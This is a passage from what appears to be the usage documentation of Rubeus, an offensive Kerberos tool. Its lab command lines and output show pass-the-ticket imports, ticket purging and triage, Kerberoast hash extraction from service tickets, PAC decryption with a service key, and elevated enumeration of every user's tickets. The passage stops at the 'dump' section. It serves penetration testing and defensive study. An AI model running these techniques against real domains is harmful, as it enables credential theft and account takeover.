___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM\r\n        Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : dfm.a @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)\r\n\r\n\r\n**Elevated** ticket application to another logon session:\r\n\r\n    C:\\Rubeus>Rubeus.exe klist /luid:0x474722b\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (All Users)\r\n\r\n    [*] Target LUID     : 0x474722b\r\n\r\n    UserName                 : patsy\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x474722b\r\n    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169\r\n    AuthenticationPackage    : Kerberos\r\n    LogonType                : Interactive\r\n    LogonTime                : 2/11/2019 10:58:53 PM\r\n    LogonServer              : PRIMARY\r\n    LogonServerDNSDomain     : TESTLAB.LOCAL\r\n    UserPrincipalName        : patsy@testlab.local\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 2:58:53 PM ; 2/11/2019 7:58:53 PM ; 2/18/2019 2:58:53 PM\r\n        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL\r\n        Client Name       : patsy @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)\r\n\r\n\r\n    C:\\Rubeus>Rubeus.exe ptt /luid:0x474722b /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Import Ticket\r\n    [*] Target LUID: 0x474722b\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>Rubeus.exe klist /luid:0x474722b\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (All Users)\r\n\r\n    [*] Target LUID     : 0x474722b\r\n\r\n    UserName                 : patsy\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x474722b\r\n    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169\r\n    AuthenticationPackage    : Kerberos\r\n    LogonType                : Interactive\r\n    LogonTime                : 2/11/2019 10:58:53 PM\r\n    LogonServer              : PRIMARY\r\n    LogonServerDNSDomain     : TESTLAB.LOCAL\r\n    UserPrincipalName        : patsy@testlab.local\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM\r\n        Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : dfm.a @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)\r\n\r\n\r\n### purge\r\n\r\nThe **purge** action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by `/luid:0xA..`.\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM\r\n        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)\r\n\r\n        [1] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM\r\n        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)\r\n\r\n        [2] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 3:05:36 PM ; 2/11/2019 8:05:36 PM ; 2/18/2019 3:05:36 PM\r\n        Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)\r\n\r\n\r\n    C:\\Rubeus>Rubeus.exe purge\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    Luid: 0x0\r\n\r\n    [*] Action: Purge Tickets\r\n    [+] Tickets successfully purged!\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n\r\n    C:\\Rubeus>\r\n\r\n\r\n**Elevated** purging of another logon session:\r\n\r\n    C:\\Rubeus>Rubeus.exe triage /luid:0x474722b\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: Triage Kerberos Tickets\r\n\r\n    [*] Target LUID     : 0x474722b\r\n\r\n    -----------------------------------------------------------------------------------\r\n    | LUID      | UserName              | Service              | EndTime              |\r\n    -----------------------------------------------------------------------------------\r\n    | 0x474722b | dfm.a @ TESTLAB.LOCAL | krbtgt/testlab.local | 2/11/2019 7:55:18 PM |\r\n    -----------------------------------------------------------------------------------\r\n\r\n\r\n    C:\\Rubeus>Rubeus.exe purge /luid:0x474722b\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    Luid: 0x474722b\r\n\r\n    [*] Action: Purge Tickets\r\n    [*] Target LUID: 0x474722b\r\n    [+] Tickets successfully purged!\r\n\r\n    C:\\Rubeus>Rubeus.exe triage /luid:0x474722b\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: Triage Kerberos Tickets\r\n\r\n    [*] Target LUID     : 0x474722b\r\n\r\n    ---------------------------------------\r\n    | LUID | UserName | Service | EndTime |\r\n    ---------------------------------------\r\n    ---------------------------------------\r\n\r\n\r\n### describe\r\n\r\nThe **describe** action takes a `/ticket:X` value (TGT or service ticket), parses it, and describes the values of the ticket. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.\r\n\r\nIf the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.\r\n\r\nThe EncTicketPart (encrypted section of the ticket) can be decrypted using the `/servicekey:X` argument, this will also verify the ServerChecksum within the PAC. The `/krbkey:X` argument can also be used for service tickets to verify the KDCChecksum and TicketChecksum (if it exists).\r\n\r\nBy passing the `/serviceuser:X` argument (and `/servicedomain:X` is required), an crackable \"hash\" can be formed from an AES256 encrypted ticket service ticket.\r\n\r\nDisplay information about a TGT:\r\n\r\n    C:\\Rubeus>Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  dfm.a\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  krbtgt/testlab.local\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  2/11/2019 2:55:18 PM\r\n    EndTime               :  2/11/2019 7:55:18 PM\r\n    RenewTill             :  2/18/2019 2:55:18 PM\r\n    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\r\n    KeyType               :  rc4_hmac\r\n    Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==\r\n\r\nDisplay information about service ticket with an extracted Kerberoast \"hash\":\r\n\r\n    C:\\Rubeus>Rubeus.exe describe /ticket:service_ticket.kirbi\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.1\r\n\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  harmj0y\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  asdf/asdfasdf\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  2/20/2019 8:58:14 AM\r\n    EndTime               :  2/20/2019 12:41:09 PM\r\n    RenewTill             :  2/27/2019 7:41:09 AM\r\n    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\r\n    KeyType               :  rc4_hmac\r\n    Base64(key)           :  WqGWK4htp7rM1CURpxjMPA==\r\n    Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...\r\n\r\nDisplay information about a TGT along with the decrypted PAC:\r\n\r\n    C:\\Rubeus>Rubeus.exe describe /servicekey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ticket:doIFaDCCBWSgAw...(snip)...HBhY2subG9jYWw=\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n\r\n      ServiceName              :  krbtgt/rubeus.ghostpack.local\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  exploitph\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  28/07/2021 21:25:45\r\n      EndTime                  :  29/07/2021 07:25:45\r\n      RenewTill                :  04/08/2021 21:25:45\r\n      Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\r\n      KeyType                  :  rc4_hmac\r\n      Base64(key)              :  Gcf0pE1AVgbbmtSRqJbf9A==\r\n      Decrypted PAC            :\r\n        LogonInfo              :\r\n          LogonTime            : 20/07/2021 22:10:22\r\n          LogoffTime           :\r\n          KickOffTime          :\r\n          PasswordLastSet      : 14/07/2021 00:50:44\r\n          PasswordCanChange    : 15/07/2021 00:50:44\r\n          PasswordMustChange   :\r\n          EffectiveName        : exploitph\r\n          FullName             : Exploit PH\r\n          LogonScript          :\r\n          ProfilePath          :\r\n          HomeDirectory        :\r\n          HomeDirectoryDrive   :\r\n          LogonCount           : 11\r\n          BadPasswordCount     : 0\r\n          UserId               : 1104\r\n          PrimaryGroupId       : 513\r\n          GroupCount           : 1\r\n          Groups               : 513\r\n          UserFlags            : (32) EXTRA_SIDS\r\n          UserSessionKey       : 0000000000000000\r\n          LogonServer          : PDC1\r\n          LogonDomainName      : RUBEUS\r\n          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039\r\n          UserAccountControl   : (262672) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION\r\n          ExtraSIDCount        : 1\r\n          ExtraSIDs            : S-1-18-1\r\n          ResourceGroupCount   : 0\r\n        ClientName             :\r\n          Client Id            : 28/07/2021 21:25:45\r\n          Client Name          : exploitph\r\n        UpnDns                 :\r\n          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL\r\n          UPN                  : exploitph@rubeus.ghostpack.local\r\n          Flags                : 0\r\n        ServerChecksum         :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : DC220C13C97C5723456DADE2 (VALID)\r\n        KDCChecksum            :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : 32C03715F0B11E3D2EDA3D05 (VALID)\r\n\r\nDisplaying information about an AES256 encrypted service ticket with an extracted Kerberoast \"hash\":\r\n\r\n    C:\\Rubeus>Rubeus.exe describe /serviceuser:exploitph /ticket:doIFSjCCB...(snip)...Vyb2FzdBsCbWU=\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n\r\n      ServiceName              :  roast/me\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  harmj0y\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  28/07/2021 21:31:57\r\n      EndTime                  :  29/07/2021 07:31:20\r\n      RenewTill                :  04/08/2021 21:31:20\r\n      Flags                    :  name_canonicalize, pre_authent, renewable\r\n      KeyType                  :  aes256_cts_hmac_sha1\r\n      Base64(key)              :  T+hpOdnnvvLhnSwup/O/DmYYY3CXVP4kN/Hq5qWWwKg=\r\n      Kerberoast Hash       :  $krb5tgs$18$exploitph$RUBEUS.GHOSTPACK.LOCAL$*roast/me*$1063B9C2E8BAB76E5051F5DE\r\n                               $CD5F3403552BD882CBC52389C9851EFD9B7B72174CCA44876DD4E2958FE807B2A899EE33279835D\r\n                               01BEF12B6FE65174B4BF7B6A5062F45DDBEDA76CF2B122579194B3F1CF3192F982EFE5109B4FF644\r\n                               FDE4D4A170551B764A699DC4DB3535AE937E24D8D5EF0C980C98D115A6707A1F2583FAAB76FD4514\r\n                               6957453FAAD213EF28ACED98E72CC909FCC8CB0FD904DE71607BB1C25163EC9512996057CB34950F\r\n                               40480CABC5CA812B06E461FF3ECAE62022D7BA3500B506AF9BCD557DB987D565FEC8583E5C093AB5\r\n                               AF7387930AE3DBC0C4197DB75988D0785E90B1C799C1245CBC891BEC5008BFED99A8042214300440\r\n                               4846C3296A721B546428CA71640B2BDD730ADEDBE6217C572288D904E5F64843148EF30BED8F62A7\r\n                               A038B770DDD787BBBDCCBC4BF63EAC4C18E596F9A1C21B3265C1D402E84547B5491E4FE8E9B05E10\r\n                               606773DA47C2570B7B191AE2648C0C467ED242F86C2DC5BD90D5E07D5C3DAACC917E796E5ACB416B\r\n                               8D980AC30D300016556AEF064DC6C0822D6EAEF41EC5C376E46BE54AB6B85959BDEDF0D15F87AD07\r\n                               14F8999503F6DEEDC5F1798D7F82FB4A068D1C44A761C44589EAF7E17D4C855893A8C71B2FE309EB\r\n                               2FE87D36429CF0CA9AA3B02C981F2E6900D0B887EBF1438B3D084963D5AD6B06894A49D3BFED4A19\r\n                               5CA0A544A6E73B46E85C0B5E6F7230884E44B265A48CB5EFF3EC699B63DF4C5241FC11F2E74953CF\r\n                               DD610C9B3137CD15C716E538F42464A37D2B5F719B6FD0D783509B503E68F46F1FE0E03D12B97B79\r\n                               6EFB104E093F625894C59BC025273CF0F0B1EF975FF9584AEE227E27304DE545C71B367BEF2EF6DA\r\n                               22CFF2940387DEA77446B84AC436C7FD273C04247D67334A8D2F2729DE88287BB270D0F495F8EA50\r\n                               126EA94E7417A4191D080A7284FF2736C704A03EF7F7A044A6E357972A7BAC56AD3775C110A10954\r\n                               0656CB6759BB61B47B7FF5545A97735279CDB281F632DAD91047FBEC3E98F8B5BC10CA4FFE446186\r\n                               67BC174CFE97E2262EE8E4651AB460AB2E9A1B214566969FE30BC9A2EEA2BBC79E1ABDBB5A6E8BB6\r\n                               0EF60EB33DCA0F50682DAB8A2F4AE863F83AD928E8D977AA2079706827B78A0CF37FA2D62EAD3A14\r\n                               70625022335458E0E84C11786E9A84CAB5A136777B9E8293142D62D96DF9E04AACE6839E13CC54CA\r\n                               B2B7F5752F8CE9544D7076960CCD7D26C8A0E8E9C879A11A44D2BCC607CE15862E29361C786C095C\r\n                               1EA55D7BD277E581E2488BD3FA4B8E09C331A1E7E3C4BE1C745B59E710362F8EEE9578EF9E5FB34F\r\n                               AAA63C3D7D85000A84A29831B01BD0F4239263FDF59621E57CEE718B29AA2561857C4CD8020AF057\r\n                               AB5AC097DA90E9B15F6C881F47D95A9F9C15B60EE0B821FDDEB3A9AD4D71E\r\n\r\n\r\n## Ticket Extraction and Harvesting\r\n\r\nBreakdown of the ticket extraction/harvesting commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [triage](#triage) | LUID, username, service target, ticket expiration |\r\n| [klist](#klist) | Detailed logon session and ticket info |\r\n| [dump](#dump) | Detailed logon session and ticket data |\r\n| [tgtdeleg](#tgtdeleg) | Retrieve usable TGT for non-elevated user |\r\n| [monitor](#monitor) | Monitor logon events and dump new tickets |\r\n| [harvest](#harvest) | Same as monitor but with auto-renewal functionality|\r\n\r\n**Note:** [triage](#triage)/[klist](#klist)/[dump](#dump) give increasing amounts of ticket detail.\r\n\r\n\r\n### triage\r\n\r\nThe **triage** action will output a table of the current user's Kerberos tickets, if not elevated. If run from an elevated context, a table describing all Kerberos tickets on the system is displayed. Ticket can be filtered for a specific service with `/service:SNAME`.\r\n\r\nIf elevated, tickets can be filtered for a specific LogonID with `/luid:0xA..` or a specific user with `/user:USER`. This can be useful when triaging systems with a lot of Kerberos tickets.\r\n\r\nTriage all enumerateable tickets (non-elevated):\r\n\r\n    C:\\Rubeus>Rubeus.exe triage\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n\r\n    [*] Action: Triage Kerberos Tickets (Current User)\r\n\r\n    [*] Current LUID    : 0x4420e\r\n\r\n    -----------------------------------------------------------------------------------------\r\n    | LUID    | UserName                | Service                    | EndTime              |\r\n    -----------------------------------------------------------------------------------------\r\n    | 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |\r\n    | 0x4420e | harmj0y @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL       | 2/12/2019 4:04:14 PM |\r\n    | 0x4420e | harmj0y @ TESTLAB.LOCAL | cifs/primary.testlab.local | 2/12/2019 4:04:14 PM |\r\n    -----------------------------------------------------------------------------------------\r\n\r\nTriage all enumerateable tickets (elevated):\r\n\r\n    C:\\Rubeus>Rubeus.exe triage\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n\r\n    [*] Action: Triage Kerberos Tickets (All Users)\r\n\r\n    -------------------------------------------------------------------------------------------------------------\r\n    | LUID      | UserName                   | Service                                  | EndTime               |\r\n    -------------------------------------------------------------------------------------------------------------\r\n    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |\r\n    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:14 PM  |\r\n    | 0x56cdda9 | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 4:04:14 PM  |\r\n    | 0x56cdd86 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 4:04:02 PM  |\r\n    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |\r\n    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:19:11 PM  |\r\n    | 0x47869cc | harmj0y @ TESTLAB.LOCAL    | cifs/primary.testlab.local               | 2/12/2019 3:19:11 PM  |\r\n    | 0x47869b4 | harmj0y @ TESTLAB.LOCAL    | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 3:05:29 PM  |\r\n    | 0x3c4c241 | dfm.a @ TESTLAB.LOCAL      | krbtgt/TESTLAB.LOCAL                     | 2/11/2019 4:24:02 AM  |\r\n    | 0x441d8   | dfm.a @ TESTLAB.LOCAL      | cifs/primary.testlab.local               | 2/10/2019 11:41:26 PM |\r\n    | 0x441d8   | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |\r\n    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |\r\n    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 1:25:01 PM  |\r\n    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local               | 2/12/2019 1:25:01 PM  |\r\n    | 0x3e4     | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |\r\n    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |\r\n    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | krbtgt/TESTLAB.LOCAL                     | 2/12/2019 2:23:45 PM  |\r\n    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | cifs/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |\r\n    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | WINDOWS10$                               | 2/12/2019 2:23:45 PM  |\r\n    | 0x3e7     | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |\r\n    -------------------------------------------------------------------------------------------------------------\r\n\r\n\r\nTriage targeting a specific service (elevated):\r\n\r\n    C:\\Rubeus>Rubeus.exe triage /service:ldap\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n\r\n    [*] Action: Triage Kerberos Tickets (All Users)\r\n\r\n    [*] Target service  : ldap\r\n\r\n    -----------------------------------------------------------------------------------------------------------\r\n    | LUID    | UserName                   | Service                                  | EndTime               |\r\n    -----------------------------------------------------------------------------------------------------------\r\n    | 0x441d8 | dfm.a @ TESTLAB.LOCAL      | LDAP/primary.testlab.local               | 2/10/2019 11:41:26 PM |\r\n    | 0x3e4   | windows10$ @ TESTLAB.LOCAL | ldap/primary.testlab.local/testlab.local | 2/11/2019 7:23:48 PM  |\r\n    | 0x3e7   | windows10$ @ TESTLAB.LOCAL | LDAP/PRIMARY.testlab.local/testlab.local | 2/12/2019 2:23:45 PM  |\r\n    -----------------------------------------------------------------------------------------------------------\r\n\r\n\r\n### klist\r\n\r\nThe **klist** will list detailed information on the current user's logon session and Kerberos tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Kerberos tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with `/luid:0xA..` (if elevated).\r\n\r\nListing the current (non-elevated) user's logon session and Kerberos ticket information:\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n    [*] Current LUID    : 0x4420e\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/12/2019 11:04:14 AM ; 2/12/2019 4:04:14 PM ; 2/19/2019 11:04:14 AM\r\n        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, renewable, forwarded, forwardable (60a10000)\r\n\r\n        ...(snip)...\r\n\r\n\r\n**Elevated** listing of another user's logon session/Kerberos ticket information:\r\n\r\n    C:\\Rubeus>Rubeus.exe klist /luid:0x47869b4\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (All Users)\r\n\r\n    [*] Target LUID     : 0x47869b4\r\n\r\n    UserName                 : harmj0y\r\n    Domain                   : TESTLAB\r\n    LogonId                  : 0x47869b4\r\n    UserSID                  : S-1-5-21-883232822-274137685-4173207997-1111\r\n    AuthenticationPackage    : Kerberos\r\n    LogonType                : Interactive\r\n    LogonTime                : 2/11/2019 11:05:31 PM\r\n    LogonServer              : PRIMARY\r\n    LogonServerDNSDomain     : TESTLAB.LOCAL\r\n    UserPrincipalName        : harmj0y@testlab.local\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/11/2019 3:05:31 PM ; 2/11/2019 8:05:31 PM ; 2/18/2019 3:05:31 PM\r\n        Server Name       : krbtgt/TESTLAB.LOCAL @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)\r\n\r\n        ...(snip)...\r\n\r\n\r\n### dump\r\n\r\nThe **dump** action will extract current TGTs and service tickets if in an elevated context. If not elevated, service tickets for the current user are extracted. The resulting extracted tickets can be filtered by `/service` (use `/service:krbtgt` for TGTs) and/or logon ID (the `/luid:0xA..` parameter). The KRB-CRED files (.kirbis) are output as base64 blobs and can be reused with the ptt function, or Mimikatz's **kerberos::ptt** functionality.\r\n\r\n**Note:** if run from a _non-elevated_ context, the session keys for TGTs are not returned (by default) from the associated APIs, so only service tickets extracted will be usable. If you want to (somewhat) workaround this, use the **tgtdeleg** command.\r\n\r\nExtracting the current user's usable service tickets:\r\n\r\n    